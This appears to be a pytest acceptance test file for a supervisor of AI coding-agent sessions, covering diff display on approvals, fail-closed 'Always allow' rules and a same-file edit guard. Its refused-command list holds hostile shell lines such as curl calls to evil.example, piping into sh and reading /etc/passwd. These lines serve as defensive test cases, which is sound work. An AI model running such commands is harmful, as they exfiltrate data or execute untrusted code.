# ruff: noqa: F811
"""Acceptance tests for the second foreman release: the smart approval card (diff, rule key,
approve similar), learned "Always allow" rules, and the same-file guard. SPEC.md, section
Foreman, holds the contract.

Rules are off by default and fail closed: a call is allowed by a rule only when every part
of it matches a rule, and any shell construct that the matcher cannot read safely sends the
call to the page as before.
"""

import json
import os
import signal
import subprocess
import sys
import time

import pytest
from test_acceptance import (  # noqa: F401
    ROOT,
    by_name,
    enc,
    home,
    post,
    server,
    state,
    wait_for,
    write_jsonl,
)
from test_controls import finish, run_install, start_hook  # noqa: F401
from test_foreman_core import append, call, drop, now_ms, procs, user_prompt  # noqa: F401

HOOK = ROOT / "agentforeman" / "agentforeman_hook.py"


def request(ctl, rid, pid, sid, tool, inp, created_ms=None):
    drop(
        ctl / "requests",
        f"{rid}.json",
        {
            "id": rid,
            "pid": pid,
            "session_id": sid,
            "agent_id": None,
            "tool_name": tool,
            "tool_input": inp,
            "created_ms": created_ms or now_ms(),
        },
    )


def approval(port, name, rid=None):
    ap = by_name(state(port), name)["approval"]
    return ap if ap and (rid is None or ap["request_id"] == rid) else None


def real_session(home, procs, tmp_path, sid="sid-real", name="real-1"):  # noqa: F811
    """A busy session whose folder exists on disk, so a Write can be compared with the file."""
    cwd = tmp_path / "proj"
    cwd.mkdir(exist_ok=True)
    pid = procs()
    (home["claude"] / "sessions" / f"{pid}.json").write_text(
        json.dumps(
            {
                "pid": pid,
                "sessionId": sid,
                "cwd": str(cwd),
                "name": name,
                "status": "busy",
                "entrypoint": "cli",
                "startedAt": now_ms() - 3_600_000,
                "statusUpdatedAt": now_ms() - 60_000,
            }
        )
    )
    write_jsonl(
        home["claude"] / "projects" / enc(str(cwd)) / f"{sid}.jsonl",
        [user_prompt(sid, "Write the notes", -60)],
    )
    return cwd


# The diff on an approval


def test_an_edit_approval_carries_its_diff(server, home, procs):  # noqa: F811
    inp = {
        "file_path": "/work/beta/app.py",
        "old_string": "retries = 1\n",
        "new_string": "retries = 5\n",
    }
    request(home["control"], "ed1", procs(), "sid-beta", "Edit", inp)
    ap = wait_for(lambda: approval(server, "beta-1", "ed1"))
    assert "-retries = 1" in ap["diff"] and "+retries = 5" in ap["diff"]


def test_a_multiedit_approval_shows_every_edit(server, home, procs):  # noqa: F811
    inp = {
        "file_path": "/work/beta/app.py",
        "edits": [
            {"old_string": "a = 1\n", "new_string": "a = 2\n"},
            {"old_string": "b = 1\n", "new_string": "b = 3\n"},
        ],
    }
    request(home["control"], "me1", procs(), "sid-beta", "MultiEdit", inp)
    ap = wait_for(lambda: approval(server, "beta-1", "me1"))
    for line in ("-a = 1", "+a = 2", "-b = 1", "+b = 3"):
        assert line in ap["diff"]


def test_a_write_inside_the_session_folder_diffs_against_the_file(
    server,
    home,
    procs,
    tmp_path,  # noqa: F811
):
    cwd = real_session(home, procs, tmp_path)
    (cwd / "notes.txt").write_text("alpha\nbeta\n")
    inp = {"file_path": str(cwd / "notes.txt"), "content": "alpha\ngamma\n"}
    request(home["control"], "wr1", procs(), "sid-real", "Write", inp)
    ap = wait_for(lambda: approval(server, "real-1", "wr1"))
    assert "-beta" in ap["diff"] and "+gamma" in ap["diff"] and "alpha" in ap["diff"]


def test_a_write_of_a_new_file_shows_all_lines_as_added(server, home, procs, tmp_path):  # noqa: F811
    cwd = real_session(home, procs, tmp_path)
    inp = {"file_path": str(cwd / "new.txt"), "content": "hello\nworld\n"}
    request(home["control"], "wr2", procs(), "sid-real", "Write", inp)
    ap = wait_for(lambda: approval(server, "real-1", "wr2"))
    assert "+hello" in ap["diff"] and "+world" in ap["diff"]


def test_a_write_outside_the_session_folder_never_shows_the_old_file(
    server,
    home,
    procs,
    tmp_path,  # noqa: F811
):
    real_session(home, procs, tmp_path)
    secret = tmp_path / "outside" / "id_key"
    secret.parent.mkdir()
    secret.write_text("SECRET-OLD-LINE\n")
    request(
        home["control"],
        "wr3",
        procs(),
        "sid-real",
        "Write",
        {"file_path": str(secret), "content": "x\n"},
    )
    ap = wait_for(lambda: approval(server, "real-1", "wr3"))
    assert ap["diff"] is None and ap["diff_note"]
    assert "SECRET-OLD-LINE" not in json.dumps(state(server))


def test_a_write_through_a_link_out_of_the_folder_never_shows_the_target(
    server,
    home,
    procs,
    tmp_path,  # noqa: F811
):
    cwd = real_session(home, procs, tmp_path)
    secret = tmp_path / "outside" / "id_key"
    secret.parent.mkdir()
    secret.write_text("SECRET-OLD-LINE\n")
    os.symlink(secret, cwd / "link.txt")
    request(
        home["control"],
        "wr4",
        procs(),
        "sid-real",
        "Write",
        {"file_path": str(cwd / "link.txt"), "content": "x\n"},
    )
    ap = wait_for(lambda: approval(server, "real-1", "wr4"))
    assert ap["diff"] is None
    assert "SECRET-OLD-LINE" not in json.dumps(state(server))


def test_a_write_of_a_large_file_shows_no_diff(server, home, procs, tmp_path):  # noqa: F811
    cwd = real_session(home, procs, tmp_path)
    (cwd / "big.txt").write_text("line\n" * 80_000)
    request(
        home["control"],
        "wr5",
        procs(),
        "sid-real",
        "Write",
        {"file_path": str(cwd / "big.txt"), "content": "short\n"},
    )
    ap = wait_for(lambda: approval(server, "real-1", "wr5"))
    assert ap["diff"] is None and ap["diff_note"]


def test_a_bash_approval_has_no_diff(server, home, procs):  # noqa: F811
    request(home["control"], "b1", procs(), "sid-beta", "Bash", {"command": "make"})
    assert wait_for(lambda: approval(server, "beta-1", "b1"))["diff"] is None


# The rule key and approve similar


@pytest.mark.parametrize(
    "tool,inp,key",
    [
        ("Bash", {"command": "npm test -- --watch=false"}, "Bash(npm test)"),
        ("Bash", {"command": "cd /work/beta && npm test"}, "Bash(npm test)"),
        ("Bash", {"command": "CI=1 npm test"}, "Bash(npm test)"),
        ("Bash", {"command": "make"}, "Bash(make)"),
        (
            "Edit",
            {"file_path": "/work/beta/app.py", "old_string": "a", "new_string": "b"},
            "Edit(/work/beta/app.py)",
        ),
        (
            "WebFetch",
            {"url": "https://docs.python.org/3/library/", "prompt": "x"},
            "WebFetch(docs.python.org)",
        ),
        ("Grep", {"pattern": "TODO"}, "Grep"),
    ],
)
def test_each_approval_has_a_rule_key(server, home, procs, tool, inp, key):  # noqa: F811
    request(home["control"], "k1", procs(), "sid-beta", tool, inp)
    assert wait_for(lambda: approval(server, "beta-1", "k1"))["rule_key"] == key


def test_approve_similar_answers_every_request_with_the_same_key(server, home, procs):  # noqa: F811
    ctl = home["control"]
    request(
        ctl,
        "s1",
        procs(),
        "sid-beta",
        "Bash",
        {"command": "npm test -- --shard=1"},
        now_ms() - 3000,
    )
    request(
        ctl,
        "s2",
        procs(),
        "sid-gamma",
        "Bash",
        {"command": "cd /work/gamma && npm test"},
        now_ms() - 2000,
    )
    request(
        ctl,
        "s3",
        procs(),
        "sid-gamma",
        "Bash",
        {"command": "rm -rf build"},
        now_ms() - 1000,
    )
    ap = wait_for(
        lambda: (a := approval(server, "beta-1", "s1")) and a["similar"] == 1 and a
    )
    assert ap["rule_key"] == "Bash(npm test)"
    code, body = post(
        server,
        "/api/approve",
        {"request_id": "s1", "behavior": "allow", "similar": True},
    )
    assert code == 200 and body["count"] == 2
    for rid in ("s1", "s2"):
        assert (
            json.loads((ctl / "decisions" / f"{rid}.json").read_text())["behavior"]
            == "allow"
        )
    assert not (ctl / "decisions" / "s3.json").exists()


def test_edits_of_different_files_are_not_similar(server, home, procs):  # noqa: F811
    ctl = home["control"]
    request(
        ctl,
        "e1",
        procs(),
        "sid-beta",
        "Edit",
        {"file_path": "/work/beta/a.py", "old_string": "a", "new_string": "b"},
    )
    request(
        ctl,
        "e2",
        procs(),
        "sid-gamma",
        "Edit",
        {"file_path": "/work/gamma/b.py", "old_string": "a", "new_string": "b"},
    )
    ap = wait_for(lambda: approval(server, "beta-1", "e1"))
    wait_for(lambda: approval(server, "gamma-1", "e2"))
    assert ap["similar"] == 0
    code, body = post(
        server,
        "/api/approve",
        {"request_id": "e1", "behavior": "allow", "similar": True},
    )
    assert code == 200 and body["count"] == 1
    assert not (ctl / "decisions" / "e2.json").exists()


# Rules: the page side


def test_rules_start_off_and_empty(server, home):  # noqa: F811
    rules = state(server)["rules"]
    assert (
        rules["enabled"] is False
        and rules["items"] == []
        and rules["suggestions"] == []
    )


def test_the_page_adds_enables_and_removes_a_rule(server, home):  # noqa: F811
    ctl = home["control"]
    assert (
        post(server, "/api/rules", {"action": "add", "rule": "Bash(npm test)"})[0]
        == 200
    )
    saved = json.loads((ctl / "rules.json").read_text())
    assert saved["enabled"] is False, "adding a rule never turns rules on"
    assert [i["rule"] for i in saved["items"]] == ["Bash(npm test)"]
    assert post(server, "/api/rules", {"action": "enable", "enabled": True})[0] == 200
    assert json.loads((ctl / "rules.json").read_text())["enabled"] is True
    wait_for(lambda: state(server)["rules"]["enabled"])
    assert (
        post(server, "/api/rules", {"action": "remove", "rule": "Bash(npm test)"})[0]
        == 200
    )
    assert json.loads((ctl / "rules.json").read_text())["items"] == []
    assert post(server, "/api/rules", {"action": "explode"})[0] == 400


@pytest.mark.parametrize(
    "rule",
    [
        "Bash(npm test)",
        "Bash(git status)",
        "Bash(python3 -m pytest)",
        "Bash(make)",
        "Edit(/work/beta/src/)",
        "Write(/work/beta/docs/)",
        "Read(/work/beta/)",
        "WebFetch(docs.python.org)",
        "Grep",
        "Glob",
    ],
)
def test_a_valid_rule_is_accepted(server, rule):  # noqa: F811
    assert post(server, "/api/rules", {"action": "add", "rule": rule})[0] == 200


@pytest.mark.parametrize(
    "rule",
    [
        "Bash",
        "Edit",
        "Write",
        "Read",
        "WebFetch",
        "Bash(sudo apt install)",
        "Bash(python3 -c)",
        "Bash(python3)",
        "Bash(python3 -m)",
        "Bash(node -e)",
        "Bash(bash -c)",
        "Bash(sh -c)",
        "Bash(eval)",
        "Bash(env)",
        "Bash(xargs rm)",
        "Bash(npm test; rm)",
        "Bash(npm $(x))",
        "Bash(a b c d)",
        "Edit(/)",
        "Edit(relative/path)",
        "Edit(/work/../etc/)",
        "Nonsense(x)",
        "",
    ],
)
def test_a_rule_that_grants_too_much_is_refused(server, home, rule):  # noqa: F811
    assert post(server, "/api/rules", {"action": "add", "rule": rule})[0] == 400
    assert (
        not (home["control"] / "rules.json").exists()
        or not json.loads((home["control"] / "rules.json").read_text())["items"]
    )


def test_three_approvals_of_one_key_suggest_a_rule(server, home, procs):  # noqa: F811
    ctl = home["control"]
    for i in range(3):
        rid = f"a{i}"
        request(
            ctl,
            rid,
            procs(),
            "sid-beta",
            "Bash",
            {"command": f"npm test -- --shard={i}"},
        )
        wait_for(lambda: approval(server, "beta-1", rid))
        assert (
            post(server, "/api/approve", {"request_id": rid, "behavior": "allow"})[0]
            == 200
        )
    sug = wait_for(lambda: state(server)["rules"]["suggestions"])
    assert [(s["rule"], s["approvals"]) for s in sug] == [("Bash(npm test)", 3)]
    assert (
        post(server, "/api/rules", {"action": "add", "rule": "Bash(npm test)"})[0]
        == 200
    )
    wait_for(lambda: state(server)["rules"]["suggestions"] == [])


def test_denials_never_suggest_a_rule(server, home, procs):  # noqa: F811
    ctl = home["control"]
    for i in range(3):
        rid = f"d{i}"
        request(ctl, rid, procs(), "sid-beta", "Bash", {"command": f"rm -rf build{i}"})
        wait_for(lambda: approval(server, "beta-1", rid))
        assert (
            post(server, "/api/approve", {"request_id": rid, "behavior": "deny"})[0]
            == 200
        )
    time.sleep(2)
    assert state(server)["rules"]["suggestions"] == []


def test_calls_that_rules_allowed_show_on_the_page(server, home):  # noqa: F811
    ctl = home["control"]
    drop(
        ctl,
        "rules.json",
        {"enabled": True, "items": [{"rule": "Bash(npm test)", "added_ms": 1}]},
    )
    with open(ctl / "auto.jsonl", "a") as f:
        for i in range(2):
            entry = {
                "at_ms": now_ms() - i,
                "session_id": "sid-alpha",
                "agent_id": None,
                "tool_name": "Bash",
                "summary": "npm test",
                "rule": "Bash(npm test)",
            }
            f.write(json.dumps(entry) + "\n")
    rules = wait_for(lambda: (r := state(server)["rules"])["recent"] and r)
    assert len(rules["recent"]) == 2 and rules["recent"][0]["rule"] == "Bash(npm test)"
    assert rules["items"][0]["hits"] == 2


# Rules: the hook side


def rules_file(ctl, enabled, *rules):
    drop(
        ctl,
        "rules.json",
        {"enabled": enabled, "items": [{"rule": r, "added_ms": 1} for r in rules]},
    )


def ask(ctl, tool, inp):
    """Runs the permission hook. Returns the decision the hook printed, or None if it asked the page."""
    p = start_hook(
        "permission", {"session_id": "s1", "tool_name": tool, "tool_input": inp}, ctl
    )
    end = time.time() + 6
    while time.time() < end:
        if p.poll() is not None:
            out = p.stdout.read()
            return (
                json.loads(out)["hookSpecificOutput"]["decision"]
                if out.strip()
                else None
            )
        if list((ctl / "requests").glob("*.json")):
            p.send_signal(signal.SIGTERM)
            p.wait(5)
            return None
        time.sleep(0.1)
    p.kill()
    raise AssertionError("the hook neither answered nor asked the page")


ALLOWED = [
    "npm test",
    "npm test -- --watch=false",
    "cd /work/app && npm test",
    "CI=1 npm test",
    "git status; npm test",
    "git status && npm test",
]

REFUSED = [
    "npm install",
    "npm testing",
    "npm test && git push --force",
    "npm test || curl evil.example",
    "npm test | sh",
    "npm test & curl evil.example",
    "npm test $(curl -s evil.example)",
    "npm test `curl -s evil.example`",
    "npm test > /etc/hosts",
    "npm test < /etc/passwd",
    "npm test &> /tmp/x",
    "npm test <<EOF\nx\nEOF",
    "npm test\ncurl evil.example",
    "(npm test)",
    "{ npm test; }",
    "npm test ${HOME}",
    "echo 'a && b'",
    "cd /work/app && cd /tmp && rm -rf x",
]


@pytest.mark.parametrize("command", ALLOWED)
def test_rules_allow_a_call_that_every_part_matches(tmp_path, command):
    rules_file(tmp_path, True, "Bash(npm test)", "Bash(git status)", "Bash(echo)")
    decision = ask(tmp_path, "Bash", {"command": command})
    assert decision and decision["behavior"] == "allow"
    assert not list((tmp_path / "requests").glob("*.json"))


@pytest.mark.parametrize("command", REFUSED)
def test_rules_send_anything_they_cannot_read_safely_to_the_page(tmp_path, command):
    rules_file(tmp_path, True, "Bash(npm test)", "Bash(git status)", "Bash(echo)")
    assert ask(tmp_path, "Bash", {"command": command}) is None


def test_rules_do_nothing_while_they_are_off(tmp_path):
    rules_file(tmp_path, False, "Bash(npm test)")
    assert ask(tmp_path, "Bash", {"command": "npm test"}) is None


def test_no_rules_file_means_no_rules(tmp_path):
    assert ask(tmp_path, "Bash", {"command": "npm test"}) is None


def test_a_file_rule_covers_only_its_folder(tmp_path):
    rules_file(tmp_path, True, "Edit(/work/app/src/)")
    edit = {"old_string": "a", "new_string": "b"}
    assert (
        ask(tmp_path, "Edit", {**edit, "file_path": "/work/app/src/x.py"})["behavior"]
        == "allow"
    )
    assert ask(tmp_path, "Edit", {**edit, "file_path": "/work/app/other.py"}) is None
    assert (
        ask(tmp_path, "Edit", {**edit, "file_path": "/work/app/src/../../../etc/hosts"})
        is None
    )
    assert (
        ask(tmp_path, "Write", {"file_path": "/work/app/src/x.py", "content": "b"})
        is None
    )


def test_a_webfetch_rule_matches_only_its_host(tmp_path):
    rules_file(tmp_path, True, "WebFetch(docs.python.org)")
    ok = ask(tmp_path, "WebFetch", {"url": "https://docs.python.org/3/", "prompt": "x"})
    assert ok["behavior"] == "allow"
    bad = {"url": "https://docs.python.org.evil.example/", "prompt": "x"}
    assert ask(tmp_path, "WebFetch", bad) is None


def test_a_rule_allow_is_logged_for_the_page(tmp_path):
    rules_file(tmp_path, True, "Bash(npm test)")
    assert ask(tmp_path, "Bash", {"command": "npm test"})["behavior"] == "allow"
    lines = (tmp_path / "auto.jsonl").read_text().splitlines()
    entry = json.loads(lines[-1])
    assert entry["rule"] == "Bash(npm test)" and entry["session_id"] == "s1"
    assert entry["tool_name"] == "Bash" and entry["at_ms"] > 0


# The same-file guard


def test_two_sessions_editing_one_file_are_flagged(server, home):  # noqa: F811
    eps = home["claude"] / "projects" / enc("/work/epsilon") / "sid-eps-new.jsonl"
    alpha = home["trans_a"]
    edit = {"file_path": "/work/shared/app.py", "old_string": "a", "new_string": "b"}
    append(alpha, call("sid-alpha", "sh1", "Edit", edit, -20))
    append(eps, call("sid-eps", "sh2", "Edit", edit, -10))
    a = wait_for(lambda: by_name(state(server), "alpha-1")["shared_files"])
    assert a[0]["path"] == "/work/shared/app.py"
    assert [w["name"] for w in a[0]["with"]] == ["eps-1"]
    e = by_name(state(server), "eps-1")["shared_files"]
    assert [w["name"] for w in e[0]["with"]] == ["alpha-1"]
    assert by_name(state(server), "beta-1")["shared_files"] == []
    edits = json.loads((home["control"] / "edits.json").read_text())
    assert edits["at_ms"] > now_ms() - 60_000
    who = {x["session_id"] for x in edits["files"]["/work/shared/app.py"]}
    assert who == {"sid-alpha", "sid-eps"}


def test_guard_mode_route(server, home):  # noqa: F811
    assert state(server)["guard"]["mode"] == "warn"
    assert post(server, "/api/guard", {"mode": "block"})[0] == 200
    assert json.loads((home["control"] / "guard.json").read_text())["mode"] == "block"
    wait_for(lambda: state(server)["guard"]["mode"] == "block")
    assert post(server, "/api/guard", {"mode": "maybe"})[0] == 400


def edits_file(ctl, path, *who, at_ms=None, age_s=60):
    drop(
        ctl,
        "edits.json",
        {
            "at_ms": at_ms or now_ms(),
            "files": {
                path: [
                    {
                        "session_id": sid,
                        "name": name,
                        "last_ms": now_ms() - age_s * 1000,
                    }
                    for sid, name in who
                ]
            },
        },
    )


def edit_hook(ctl, sid="me"):
    payload = {
        "session_id": sid,
        "tool_name": "Edit",
        "tool_input": {"file_path": "/w/app.py", "old_string": "a", "new_string": "b"},
    }
    out, _ = finish(start_hook("edit", payload, ctl))
    return json.loads(out)["hookSpecificOutput"] if out.strip() else None


def test_the_edit_hook_warns_by_default(tmp_path):
    edits_file(tmp_path, "/w/app.py", ("other", "web-app-3f"), ("me", "me-1"))
    h = edit_hook(tmp_path)
    assert "web-app-3f" in h["additionalContext"] and "permissionDecision" not in h


def test_the_edit_hook_asks_in_block_mode(tmp_path):
    edits_file(tmp_path, "/w/app.py", ("other", "web-app-3f"))
    drop(tmp_path, "guard.json", {"mode": "block"})
    h = edit_hook(tmp_path)
    assert (
        h["permissionDecision"] == "ask"
        and "web-app-3f" in h["permissionDecisionReason"]
    )


def test_the_edit_hook_is_quiet_when_off(tmp_path):
    edits_file(tmp_path, "/w/app.py", ("other", "web-app-3f"))
    drop(tmp_path, "guard.json", {"mode": "off"})
    assert edit_hook(tmp_path) is None


def test_the_edit_hook_is_quiet_when_only_this_session_edits(tmp_path):
    edits_file(tmp_path, "/w/app.py", ("me", "me-1"))
    assert edit_hook(tmp_path) is None


def test_the_edit_hook_ignores_old_edits(tmp_path):
    edits_file(tmp_path, "/w/app.py", ("other", "web-app-3f"), age_s=31 * 60)
    assert edit_hook(tmp_path) is None


def test_the_edit_hook_ignores_a_stale_edits_file(tmp_path):
    # The server rewrites edits.json while it runs. An old file means the server is down.
    edits_file(
        tmp_path, "/w/app.py", ("other", "web-app-3f"), at_ms=now_ms() - 10 * 60_000
    )
    assert edit_hook(tmp_path) is None


def test_the_edit_hook_fails_open(tmp_path):
    (tmp_path / "edits.json").write_text("{broken")
    assert edit_hook(tmp_path) is None
    p = subprocess.run(
        [sys.executable, str(HOOK), "edit"],
        input="not json",
        capture_output=True,
        text=True,
        env={**os.environ, "AGENTFOREMAN_HOME": str(tmp_path)},
        timeout=5,
    )
    assert (p.returncode, p.stdout) == (0, "")


def test_install_adds_the_edit_guard_hook_and_uninstall_removes_it(tmp_path):
    settings = tmp_path / "settings.json"
    original = {
        "hooks": {
            "PreToolUse": [
                {"matcher": "Bash", "hooks": [{"type": "command", "command": "mine"}]}
            ]
        }
    }
    settings.write_text(json.dumps(original))
    control = tmp_path / "ctl"
    for _ in range(2):
        assert run_install(settings, control).returncode == 0
    groups = json.loads(settings.read_text())["hooks"]["PreToolUse"]
    ours = [
        g
        for g in groups
        if any("agentforeman-hook" in h["command"] for h in g["hooks"])
    ]
    matchers = sorted(g.get("matcher", "") for g in ours)
    assert matchers == ["", "Edit|Write|MultiEdit|NotebookEdit"]
    edit_cmd = next(g for g in ours if g["matcher"])["hooks"][0]["command"]
    payload = json.dumps(
        {"session_id": "s1", "tool_name": "Edit", "tool_input": {"file_path": "/x"}}
    )
    drop(control, "guard.json", {"mode": "off"})
    t = time.time()
    r = subprocess.run(
        ["/bin/bash", "-c", edit_cmd],
        input=payload,
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert (r.returncode, r.stdout) == (0, "") and time.time() - t < 1
    assert run_install(settings, control, "--uninstall").returncode == 0
    assert json.loads(settings.read_text()) == original
